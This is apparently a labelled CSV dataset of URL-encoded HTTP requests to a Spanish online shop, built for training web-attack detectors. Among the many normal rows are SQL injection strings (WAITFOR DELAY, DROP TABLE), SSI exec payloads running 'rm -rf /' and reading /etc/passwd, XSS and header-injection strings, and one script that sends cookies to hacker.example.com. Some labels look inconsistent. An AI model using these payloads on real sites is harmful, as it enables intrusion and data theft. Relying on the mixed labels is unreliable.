payload,attack_type,label
modo=registro&login=gustave&password=v3o8720a&nombre=Mar%EDa+Begonia&apellidos=Fain%E9+Motj%E9&email=dyne%40somosagelespa%F1a.us&dni=30663985V&direccionA=Calle+Antonio+Gramsci+30%2C+12%3FB&ciudad=Narros+del+Puerto&cp=40183&provincia=Zamora&ntc=4102151120364510&B1=Registrar,cmdi,1
modo=registro&login=roobbie&password=c2nve3e213a&nombre=Ilva&apellidos=Ramallo+Cabarcos&email=betts%40beltoan.com.my&dni=98946031P&direccion=D%27+Horta%2C+S%2FN+&ciudad=Villanueva+de+San+Carlos&cp=37609&provincia=Ja%E9n&ntc=4358738088308536&B1=Registrar,normal,0
errorMsg=Credenciales+incorrectas,normal,0
id=1,normal,0
modo=entrar&login=mundy&pwd=alat%f3n&remember=on&b1=entrar,normal,0
B2=Vaciar+carrito,normal,0
modo=registro&login=reiman&password=bO01q9265_TA&nombre=Malias&apellidos=Orfila+Ochotorrena&email=hamshire_kell%40santcugatpisos.sj&dni=38449483S&direccion=Avda.+Arcangel%2C+98%2C+5%3FF&ciudad=Cana%2Blejas+de+Pe%F1a%3Ffi*el&cp=31500&provincia=A+Coru%F1a&ntc=0056594046800438&B1=Registrar,cmdi,1
modo=entrar&login=bi%27sh%2Cya&pwd=23m6%E9&remember=on&B1=Entrar,cmdi,1
B2=Vaciar+carrito%4040123,normal,1
errorMsg=Credenciales+incorrectas,normal,0
modo=entrar&login=ossie&pwd=introducci%F3n&remember=on&B1=Entrar,normal,0
modo=registro&login=vrouwerf&password=ADeMa*DOR&nombre=Teodocio&apellidos=Feixas+Sarri%E0&email=vonderlinn%40coachingevolutivo.mq&dni=99068389Y&direccion=Calle+Cerrillo+Del+Hambre%2C+130+5%3FD&ciudad=Tob%EDa&cp=50213&provincia=C%F3rdoba&ntcA=4869029822529267&B1=Registrar,cmdi,1
modo=entrar&login=hendry&pwd=cambuto&remember=off&B1=Entrar123,normal,0
modo=registro&login=eva&password=animador%21a&nombre=alonso&apellidos=chanes+galvan&email=congregation%40saludyfitness.pm&dni=08109487d&direccion=c%2f+era+val+d%27aran+s%2fn%2c+7%3fe&ciudad=benabarre&cp=43440&provincia=salamanca&ntc=3685717385941815&b1=registrar,normal,0
id=2,normal,0
errorMsg=Credenciales+incorrectas,normal,0
MODO=INSERTAR&PRECIO=%27%3bWAITFOR+DELAY+%270%3a0%3a15%27%3b--&b1=pASAR+POR+CAJA,sqli,1
B2=Vaciar+carrito123,normal,0
id=%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--123,sqli,1
B2=Vaciar+carrito,normal,0
B2=Vaciar+carrito,normal,0
modo=registro&login=hache6&password=cotu3a&nombre=gwendoline&apellidos=rueda+canuda&email=michalopoulos8%40aprendeaestudiar.vn&dni=47222830n&direccion=c%2f+josep+ametller+i+vi%f1as%2c+93%2c+&ciudad=albero+bajo&cp=50227&provincia=baleares+%28illes%29&ntc=5292453383315406&b1=registrar,normal,0
modo=registro&loginA=sabadash&password=gurullada&nombre=Sergio&apellidos=Dinardi+Compres&email=wences.seigner%40aldufa.es&dni=92012174F&direccion=Valldemosa%2C+129+4H&ciudad=Frumales&cp=19490&provincia=Valencia&ntc=5024784015351535&B1=Registrar,cmdi,1
modo=entrar&login=kartik&pwd=juglandea&remember=off&B1=Entrar,normal,0
b2=vaciar+carritoany%253f%250d%250aset-cookie%253a%2btamper%253d1041264011025374727%250d%250a,normal,1
id=2&nombre=Vino+Rioja&precio=85&cantidad=35&B1=A%F1adir+al+carrito,normal,0
modo=registro&login=nettles&password=ra0iot4248%24%F36ica&nombre=Gattas&apellidos=Vai+Gala&email=prevost_toby%40ballobar.com.ad&dni=85765253R&direccion=Carretera+400+Al+Km.+9+Del+Km.+4+Valldemossa+135+&ciudad=Alf%E1ntega&cp=09146&provincia=Asturias&ntc=8012253702008773&B1=Registrar,normal,0
modo=insertar&precioA=8409&B1=Pasar+por+caja,cmdi,1
id=2%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--123,sqli,1
MODO=REGISTRO&LOGIN=SANTITOR&PASSWORD=eNsIMIsMAmiENto&NOMBRE=lIONEL&APELLIDOS=iLIZALITURRI+cOROMINAS&EMAIL=CUBELIK%40DELTAMARINA.TH&DNI=71111353e&DIRECCION=rIOJA+153%2c+&CIUDAD=pE%f1AMELLERA+bAJA&CP=19184%27%3b+drop+table+USUARIOS%3b+select+*+from+DATOS+where+NOMBRE+like+%27%25&PROVINCIA=zAMORA&NTC=0802143307607123&b1=rEGISTRAR,sqli,1
b2=vACIAR+CARRITO%3c%21--%23exec+CMD%3d%22LS+%2f%22--%3e,sqli,1
modo=insertar&precio=252&B1A=Confirmar,cmdi,1
modo=registro&login=zarrabia&password=apo9%d30ico&nombre=orion&apellidos=linares+queralto&email=nanook%40cup-id.lu&dni=03199923w&direccion=ronda+o%27donnell%2c+106%2c+12%3fe&ciudad=oj%f3s&cp=34419&provincia=ciudad+real&ntc=7298091091245974&b1=registrar,normal,0
ID=2%3c%21--%23EXEC+CMD%3d%22RM+-RF+%2f%3bCAT+%2fETC%2fPASSWD%22+--%3e,sqli,1
MODO=%27%2c%270%27%2c%270%27%2c%270%27%2c%270%27%29%3bWAITFOR+DELAY+%270%3a0%3a15%27%3b--&PRECIO=7990&b1=pASAR+POR+CAJA,sqli,1
id=1,normal,0
errorMsg=any%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235,normal,1
modo=registro&login=sowry&password=utilitarismo&nombre=Stella+Mar%EDa&apellidos=Bartoli+Ferrada&email=puvilom%40vitalhome.wf&dni=07160844R&direccion=C%2F+Manuel+Altolaguirre%2C+62+&ciudad=Buenache+de+la+Sierra&cp=39527&provincia=%C1vila&ntc=9786890057742572&B1=Registrar123,normal,0
id=1&nombre=Vino+.*%3FRioja&precio=100&cantidad=26&B1=A%F1adir+al+carrito,cmdi,1
modo=registro&login=omayma&password=fr78gen5e&nombre=%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&apellidos=Pe%F1afiel&email=flagg%40bacoespecialselecci%F3n.lb&dni=40888726Q&direccion=Prolongacion+Jose+Zorrilla+56+&ciudad=Muxika&cp=06413&provincia=%C1vila&ntc=5771094131298411&B1=Registrar,sqli,1
modo=registro&login=croiseti&password=e0l4i1&nombre=bohdan&apellidos=carrera&email=muenpasitiwet%40magritte.gov&dni=11938734d&direccion=c%2f+hermanos+pinzon+178+&ciudad=andosilla&cp=28590&provincia=lleida&ntc=6298939668445611&b1=registrar,normal,0
errormsg=credenciales+incorrectas,normal,0
modo=registro&login=mombourq&password=AND+1%3D1&nombre=Edurne&apellidos=Charbonnier+Sisneros&email=bervil-berkel%40boda-barata.sn&dni=31182783G&direccion=Escritora+Luciana+Narvaez+67+10%3FA&ciudad=Albox&cp=44620&provincia=Le%F3n&ntc=6075270665324595&B1=Registrar,cmdi,1
modo=registro&login=dalenna&password=8on5fi4a&nombre=Atilio&apellidos=Dalmau&email=fitzmahony-mcgraw%40fotoseroticas.com.hk&dni=81621470J&direccion=C%2F+Nuestra+Se%F1ora+De+La+Cabeza+153+1%3FF&ciudad=Roperuelos+del+P%E1ramo&cp=42214&provincia=Pontevedra&ntc=4344811902014577&B1=Registrar,normal,0
modo=registro&login=nuttall&password=7alcar19&nombre=Pericles&apellidos=Forn%E9s+Rigall&email=trejan%40carloshoya.mo&dni=22997473A&direccion=Calle+Jose+Lopez+Tafall+192+&ciudad=Barrio+de+Mu%F1%F3&cp=24429&provincia=Santa+Cruz+de+Tenerife&ntc=1702414193720942&B1=Registrar123,normal,0
modo=entrar&loginA=kuntova&pwd=TROvA&remember=on&B1=Entrar,cmdi,1
errorMsgA=Credenciales+incorrectas123,normal,1
id=2&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=41&B1=A%F1adir+al+carrito,normal,0
modo=insertar&precio=4092&b1=pasar+por+caja,normal,0
modo=registro&login=babasaki&password=turAnia&nombre=Roxette&apellidos=Porras+Roger&email=yueh.frasco%40granbretana.com.hk&dni=70471887W&direccion=C%2F+Coru%F1a%2C+25%2C+3H&ciudad=Brincones&cp=25660&provincia=Palencia&ntc=5568407559303725&B1=Registrar,normal,0
modo=insertar&precio=2289&B1=Pasar+por+caja,normal,0
b2=%252b,normal,1
modo=insertar&precio=1140&B1=Confirmar,normal,0
MODO=REGISTRO&LOGIN=LACHANCE&PASSWORD=SU5A&NOMBRE=rOGATO&APELLIDOS=cUCARELL+cARIDAD&EMAIL=ZMED%40TABERNARINCONETE.UK&DNI=19477061v%27%3bWAITFOR+DELAY+%270%3a0%3a15%27%3b--&DIRECCION=mANUEL+pAEZ+xARAMILLO+33%2c+6b&CIUDAD=eSTELLA%2flIZARRA&CP=26321&PROVINCIA=tARRAGONA&NTC=9995470732934706&b1=rEGISTRAR,sqli,1
id=2,normal,0
id=2,normal,0
idA=2123,normal,1
modo=registro&login=morrie&password=%2Cint%2Ferrogativo&nombre=Erlan&apellidos=Sordo+Alquinta&email=nieva%40menorca.com.sz&dni=22787443D&direccion=Pl.+De+La+Palomera%2C+S%2FN+2%3FD&ciudad=Oss%F3+de+Si%F3&cp=31353&provincia=Badajoz&ntc=5124736256894307&B1=Registrar,cmdi,1
errorMsgA=Credenciales+incorrectas,normal,1
modo=registro&login=consalve&password=c406l2n5&nombre=Fabrizio&apellidos=Masferr%E9+Massan%E9s&email=kunneke%40storagecraft.nz&dni=89740217J&direccion=C%2F+Gravina%2C+S%2FN+&ciudad=Ig%FAzquiza&cp=17867&provincia=Alicante&ntc=6453670410602968&B1=Registrar,normal,0
B2=Vaciar+carritoany%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235123,normal,1
modo=registro&login=houdini&password=cabile%F1a&nombre=Yulisa&apellidos=Aup%ED+Feria&email=hee4%40ropadegolf.name&dni=77786356B&direccion=C%2F+Guatemala%2C+S%2FN%2C+6G&ciudad=J%E1vea%2FX%E0bia&cp=39790&provinciaA=Zaragoza&ntc=2661491792098457&B1=Registrar,cmdi,1
modo=registro&login=armstron&password=proscribir&nombre=dositeo&apellidos=sanandreu+agramunt&email=witting%40videotubo.cl&dni=84428224p&direccion=travesia+magdalena%2c+53+4%3fg&ciudad=castil+de+vela&cp=47418&provincia=vizcaya&ntc=7929689250384395&b1=registrar,normal,0
id=3&nombre=Vino+Rioja&precio=85&cantidad=80%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E&B1=A%F1adir+al+carrito123,xss,1
b2a=vaciar+carrito,normal,1
modo=registro&login=dugas&password=e00Tr6o&nombre=Jabes&apellidos=Grandia+Zarzosa&email=husky_hurlic%40ropadegolf.sn&dni=19807221N&direccion=C%2F+Dionisio+Acebal+41+&ciudad=Valverde&cp=05146&provincia=Huesca&ntc=2752106671698345&B1=Registrar,normal,0
id=2&nombre=Queso+Manchego&precio=39&cantidad=%27+DELETE+FROM+USERS&B1=A%F1adir+al+carrito,cmdi,1
modo=insertar&precio=4211&b1=confirmar,normal,0
modo=insertar&precio=1464&B1=Pasar+por+caja123,normal,0
id=2,normal,0
ID=PAROS%2522%2520STYLE%3d%2522BACKGROUND%3aURL%28JAVASCRIPT%3aALERT%28%27pAROS%27%29%29,xss,1
B2=Vaciar+carrito,normal,0
modo=insertar&precio=669&B1A=Pasar+por+caja,cmdi,1
b2=BOB%2540%253cscrIPT%253eALERT%2528pAROS%2529%253c%252fSCRipt%253e.PAROSPROXY.ORG,xss,1
modo=registro&login=nicolett&password=desbridar&nombre=Vinicio&apellidos=De+Martino+Vald%E9s&email=poomjai3%40deuxmanagement.ch&dni=01498780P&direccion=Calle+Bertran+De+Castellet+28+6E&ciudad=Agullana&cp=16741&provincia=M%E1laga&ntc=4672356462399294&B1=Registrar,normal,0
modo=insertar&precio=5289&B1=Pasar+por+caja%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--123,sqli,1
modo=entrar&login=crigger&pwdA=AcRIBaDora&remember=off&B1=Entrar,cmdi,1
ID=1%3c%21--%23EXEC+CMD%3d%22RM+-RF+%2f%3bCAT+%2fETC%2fPASSWD%22+--%3e,sqli,1
id=3&nombreA=Vino+Rioja&precio=100&cantidad=81&B1=A%F1adir+al+carrito,cmdi,1
ERRORmSG=%3c%21--%23EXEC+CMD%3d%22RM+-RF+%2f%3bCAT+%2fETC%2fPASSWD%22+--%3e,sqli,1
errormsg=credenciales+incorrectas,normal,0
errorMsg=Credenciales+incorrectas%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E,sqli,1
id=1%27INJECTED_PARAM,normal,1
modo=entrar&login=jurman5&pwd=95en6e4a3&remember=off&B1A=Entrar,cmdi,1
modo=registro&login=zinkie0&password=cONdEnsAtIVO&nombre=Clovis&apellidos=Cerda+De+Vigo&email=sangborivutr%40ssextremadura.gr&dni=54011879J&direccion=Ciencia+123+5B&ciudad=Almedina&cp=09128&provincia=Zamora&ntc=6140461790572625&B1=Registrar,normal,0
modo=entrar&login=psklib&pwd=098oro4a4&remember=on&b1=entrar,normal,0
B2A=Vaciar+carrito123,normal,1
modo=entrar&login=praxis&pwd=cochambroso&remember=off&B1=Entrar123,normal,0
modo=insertar&precio=2169&B1=Pasar+por+caja,normal,0
errormsg=credenciales+incorrectas,normal,0
modo=registro&login=patacki&password=encrasar&nombre=Idefonsa&apellidos=Xifr%F3&email=pleasande%40doloresmusculares.aq&dni=86943454G&direccion=Sanchez+49%2C+&ciudad=Elorrio&cp=34306&provincia=Valencia&ntc=9008082484622624&B1=Registrar123,normal,0
B2=Vaciar+carrito,normal,0
modo=registro&login=maggee&password=m1n*6848&nombre=Mar%EDa+Bel%E9n&apellidos=Jorge+Paquirachi&email=bartlett%40waterflyesp.eh&dni=82474321R&direccion=Calle+Silvestre+Peromarta+60%2C+&ciudad=Santa+Mar%EDa+de+las+Hoyas&cp=26213&provincia=Girona&ntc=6708008477094577&B1=Registrar,normal,0
id=3&nombre=Vino+Rioja&precio=85&cantidad=11&B1=A%F1adir+al+carrito,normal,0
modo=insertar&precio=8855&b1=pasar+por+caja,normal,0
modo=registro&login=taghizad&password=galacho&nombre=Adalgisa&apellidos=Barbar%E0+Ocaranza&email=gomarov%40manuelpaloma.fr&dni=40564971D&direccion=Calle+Membezar+0%2C+2%3FC&ciudad=San+Vicente+de+Alc%E1ntara&cp=26580&provincia=Toledo&ntc=2686315485657344&B1=Registrar,normal,0
id=1&nombre=Queso+Manchego&precioA=85&cantidad=54&B1=A%F1adir+al+carrito,cmdi,1
id=1123,normal,0
modo=entrar&login=%2Cm%3Fori%2Bmoto&pwd=p41en4t63o&remember=on&B1=Entrar,cmdi,1
modo=registro&login=charko&password=entrevenimiento&nombre=Cayetano&apellidos=any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727%250D%250A&email=ruehmann.goodrow%40cajucar.bz&dni=75246757A&direccion=C%2F+Sierra+Maigmo%2C+S%2FN%2C+1%3FD&ciudad=Villa+de+Ves&cp=09343&provincia=Guadalajara&ntc=1828745224462815&B1=Registrar,cmdi,1
modo=insertar&precio=1320&B1=Confirmar,normal,0
modo=registro&login=typer0&password=fo9nece9&nombre=Celia&apellidos=De+Cabez%F3n+Raiz%E1bal&email=trainor_chadwick%40librodeapuntes.mz&dni=12269719R&direccion=C%2F+Barranc+De+Jonqueres%2C+186%2C+&ciudad=Zas&cp=49618&provincia=%C1lava&ntc=7265260392335726&B1=Registrar,normal,0
id=3&nombre=Vino+Rioja&precio=100&cantidad=82&B1=A%F1adir+al+carrito,normal,0
idA=1,normal,1
B2=Vaciar+carrito%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--123,sqli,1
MODO=ENTRAR&LOGIN=LIVIA&PWD=D5S81L05R&REMEMBER=BOB%2540%253cscrIPT%253eALERT%2528pAROS%2529%253c%252fSCRipt%253e.PAROSPROXY.ORG&b1=eNTRAR,xss,1
b2=vaciar+carrito,normal,0
modo=insertar&precio=8012&B1=Confirmar,normal,0
id=2,normal,0
modo=entrar&login=hrenyk&pwd=embozalar&remember=off&b1=entrar,normal,0
id=%27INJECTED_PARAM,normal,1
id=1&nombre=jam%f3n+ib%e9rico&precio=100&cantidad=22&b1=a%f1adir+al+carrito,normal,0
modo=any%250ASet-cookie%253A%2BTamper%253D1041264011025374727&precio=634&B1=Pasar+por+caja,cmdi,1
modo=entrar&login=lowietje&pwd=ex074ico&remember=off&B1=Entrar,normal,0
B2=any%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235,normal,1
modo=registro&login=winfield&password=inconse_cuente&nombre=Karla&apellidos=Duchement+Tenza&email=espana%40flabingo.dk&dni=43736952Z&direccion=C%2F+San+Salvador%2C+34%2C+10%3FF&ciudad=Fontanarejo&cp=25164&provincia=Navarra&ntc=5449723667500613&B1=Registrar,normal,0
B2=Vaciar+carrito,normal,0
id=3&nombre=Queso+Manchego&precio=100&cantidad=52%27INJECTED_PARAM&B1=A%F1adir+al+carrito,cmdi,1
B2A=Vaciar+carrito,normal,1
ID=1BOB%2540%253cscrIPT%253eALERT%2528pAROS%2529%253c%252fSCRipt%253e.PAROSPROXY.ORG,xss,1
modo=registro&login=sheree&password=4a6050&nombre=Conrado&apellidos=Tejo&email=edelman1%40hotelestopsecret.mt&dni=34597096J&direccion=C%2F+Sorbona%2C+124+12-F&ciudad=Elda&cp=16537&provincia=Tarragona&ntc=5515498437464021&B1=Registrar,normal,0
B2=Vaciar+carrito,normal,0
modo=registro&login=vacher&password=coxcojita&nombre=Quiliano&apellidos=Guinea+Hinojar&email=fustukian%40comercioenlacalle.tf&dni=77232447B&direccion=Pombal+114+3%3FD&ciudad=Puerto+de+B%E9jar&cp=17463&provincia=Cantabria&ntc=5399041434530750&B1=Registrar,normal,0
modo=insertar&precio=544&B1=Confirmar123,normal,0
modo=registro&login=cecelia&password=terciopelado&nombre=Federica&apellidos=Heusser+Talo&email=sofaer%40multasdetransito.cu&dni=67293578V&direccion=Plza.+Irantzuko+Monasterioaren+63%2C+&ciudad=Purullena&cp=41111&provinciaA=Lleida&ntc=7562944888996473&B1=Registrar,cmdi,1
B2=Vaciar+carrito,normal,0
B2=Vaciar+carrito,normal,0
modo=registro&login=cryoelec&password=alargamiento&nombre=Crisp%EDn&apellidos=Godayol+Iafrate&email=brazzel1%40castigadas.am&dni=22424515K&direccion=C%2F+Torregrossa%2C+3+&ciudad=Collazos+de+Boedo&cp=37150&provincia=Le%F3n&ntc=6481855129498664&B1=Registrar,normal,0
modo=registro&login=tsern&password=S87abOC9do4&nombre=Nadir&apellidos=Ganci+Zanuy&email=wolfstone%40g-audio.a%40ero&dni=01364603J&direccion=Carrer+Sant+Antoni%2C+S%2FN+&ciudad=Torre+del+Bierzo&cp=33780&provincia=Ourense&ntc=6172384858877900&B1=Registrar,cmdi,1
errorMsg=Credenciales+incorrectas%253F,normal,1
modo=insertar&precioA=6244&B1=Pasar+por+caja,cmdi,1
B2A=Vaciar+carrito,normal,1
id=3&nombre=Queso+Manchego%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E&precio=39&cantidad=9&B1=A%F1adir+al+carrito123,sqli,1
id=1,normal,0
id=1&nombreA=Queso+Manchego&precio=100&cantidad=9&B1=A%F1adir+al+carrito,cmdi,1
errorMsg=Credenciales+incorrectas,normal,0
MODO=ENTRAR&LOGIN=KETAN&PWD=RENG1ERA%27%2c%270%27%29%3bWAITFOR+DELAY+%270%3a0%3a15%27%3b--&REMEMBER=OFF&b1=eNTRAR,sqli,1
id=1%27INJECTED_PARAM123,normal,1
modo=entrar&login=shemwell&pwd=loamiento&remember=on&b1=entrar,normal,0
errormsg=credenciales+incorrectas,normal,0
modo=registro&login=shafiq&password=4nem%F3metr6&nombre=Mirko&apellidos=Yeste+Melod%EDa&email=jones_callas1%40copiar.com.travel&dni=91512497M&direccion=C%2F+Valtravieso+S%2FN%2C+&ciudad=Villalgordo+del+Marquesado&cp=22533&provincia=Barcelona&ntc=5170755929650123&B1=Registrar123,normal,0
id=3&nombre=Jam%F3n+Ib%E9rico&precio=39%2F&cantidad=90&B1=A%F1adir+al+carrito,cmdi,1
modo=entrar&login=toshach&pwd=qUeR4N55a&remember=paros%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2&B1=Entrar,xss,1
id=%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--123,sqli,1
B2=Vaciar+carrito,normal,0
id=3&nombreA=Vino+Rioja&precio=39&cantidad=17&B1=A%F1adir+al+carrito,cmdi,1
modo=registro&login=b%3Fennet*t&password=DI26MI61&nombre=Lupo&apellidos=Planells+Teixid%F3&email=mcglory_natalia%40asesoriaviesca.sh&dni=84720383K&direccion=Pontillon%2C+162%2C+1G&ciudad=Navaquesera&cp=19390&provincia=Sevilla&ntc=5499470250597505&B1=Registrar,cmdi,1
modo=registro&login=nordskog&passwordA=c0nno7a6a914&nombre=Irineo&apellidos=Benedetti+Lozana&email=coxen%40sms24h.br&dni=16540072J&direccion=Calle+Sancho+32+&ciudad=Guadassuar&cp=05644&provincia=C%F3rdoba&ntc=4808153993761167&B1=Registrar,cmdi,1
modo=registro&login=hurwitz&password=P7rdUlarIo&nombre=Yasmila&apellidosA=Raquer+De+la+Poza&email=kober%40sindns.ve&dni=24117332S&direccion=Calle+Barri+Trinitat+Nova%2C+S%2FN%2C+13D&ciudad=Parra+de+las+Vegas%2C+La&cp=12709&provincia=Le%F3n&ntc=1828745224462815&B1=Registrar,cmdi,1
id=2sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E123,normal,1
b2=%253cscript%253eALERT%2528%2522pAROS%2522%2529%253b%253c%252fscript%253e,xss,1
modo=insertar&precio=1365&B1=Confirmar,normal,0
errormsga=credenciales+incorrectas,normal,1
B2=Vaciar+carrito,normal,0
id=2&nombre=vino+rioja&precio=85&cantidad=76&b1=a%f1adir+al+carrito,normal,0
modo=registro&login=ghossein&password=8i0l%ED2&nombre=Anael&apellidos=Febrer+Pedrouzo&email=arpad4%40emepleo.lr&dni=90658868K&direccion=C%2F+Astilleros%2C+129%2C+&ciudad=Tei%E0&cp=50100&provincia=Zaragoza&ntc=3186627053603991&B1=Registrar123,normal,0
modoA=insertar&precio=400&B1=Pasar+por+caja,cmdi,1
modo=registro&login=rees&password=dular&nombre=Kenji&apellidos=Irizar+Morata&email=alarcon%4024htranslations.cr&dni=75817612K&direccion=C%2F+Vallcorba+152%2C+7%3FF&ciudad=Aldeaseca+de+Alba&cp=24226&provincia=Salamanca&ntc=4796381600285073&B1=Registrar,normal,0
modo=entrar&login=hedrich&pwd=chonta&remember=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&B1=Entrar123,sqli,1
modo=insertar&precioA=8460&B1=Pasar+por+caja,cmdi,1
modo=registro&login=nataniel&password=53rD11c4&nombre=Ligia&apellidos=Klindt+Vanega&email=mcvey%40psy%40kot%40erapi.%40aero&dni=96785368B&direccion=Pintor+Clemente+De+Torres+169+&ciudad=Pr%E1danos+de+Bureba&cp=09125&provincia=Guadalajara&ntc=2447487443590870&B1=Registrar,cmdi,1
modo=registro&login=lachance&password=su5a&nombre=Rogato&apellidos=Cucarell+Caridad&email=hed%40ay%40a%40d%40rivinn.tl&dni=19477061V&direccion=Manuel+Paez+Xaramillo+33%2C+6B&ciudad=Estella%2FLizarra&cp=26321&provincia=Tarragona&ntc=9995470732934706&B1=Registrar,cmdi,1
